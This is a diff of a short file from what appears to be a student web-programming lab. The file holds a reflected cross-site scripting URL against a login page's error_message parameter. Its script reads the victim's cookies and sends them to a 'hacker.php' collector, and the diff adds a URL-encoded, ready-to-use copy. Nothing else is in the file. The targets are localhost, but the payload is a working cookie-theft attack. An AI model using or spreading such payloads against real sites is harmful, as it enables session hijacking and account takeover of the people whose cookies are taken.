@@ -1,1 +1,7 @@
-http://localhost/web_programmming_asm3_group1/code/login-box.php?error_message=<script>let cookie = document.cookie; window.location.href=`http://localhost/cross_scripting/hacker.php?stolen-cookie=${cookie}`</script>
+http://localhost/web_programmming_asm3_group1/code/login-box.php?error_message=
+<script>
+    let cookie = document.cookie; window.location.href=`http://localhost/cross_scripting/hacker.php?stolen-cookie=${cookie}`
+</script>
+
+Encoded URL:
+http://localhost/web_programmming_asm3_group1/code/login-box.php?error_message=%3Cscript%3Elet%20cookie%20%3D%20document.cookie%3B%20window.location.href%3D%60http%3A%2F%2Flocalhost%2Fcross_scripting%2Fhacker.php%3Fstolen-cookie%3D%24%7Bcookie%7D%60%3C%2Fscript%3E
